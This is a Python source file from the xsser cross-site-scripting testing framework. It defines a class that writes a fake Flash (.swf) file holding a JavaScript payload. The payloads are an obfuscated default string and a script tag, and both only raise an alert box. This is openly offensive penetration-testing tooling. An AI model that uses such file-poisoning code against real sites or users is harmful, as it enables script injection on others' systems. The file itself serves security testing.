#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
$Id$

This file is part of the xsser project, http://xsser.03c8.net

Copyright (c) 2011/2016 psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os

class FlashInjections(object):
    
    def __init__(self, payload =''):
        self._payload = payload

    def flash_xss(self, filename, payload):
        """
        Create -fake- flash movie (.swf) with code XSS injected.
	"""
        root, ext = os.path.splitext(filename)
        if ext.lower() in [".swf"]:
            f = open(filename, 'wb')
            user_payload = payload
            if not user_payload:
                user_payload = 'a="get";b="URL";c="javascript:";d="alert("XSS");void(0);";eval(a+b)(c+d);'
            if ext.lower() == ".swf":
                content = user_payload
            f.write(content)
            f.close()
            flash_results = "\nCode: "+ content + "\nFile: ", root + ext
        else:
            flash_results = "\nPlease select a filename with extension .swf"
        return flash_results

if __name__ == '__main__':
    flash_xss_injection = FlashInjections('')
    print flash_xss_injection.flash_xss('FlashXSSpoison.swf' , "<script>alert('XSS')</script>")
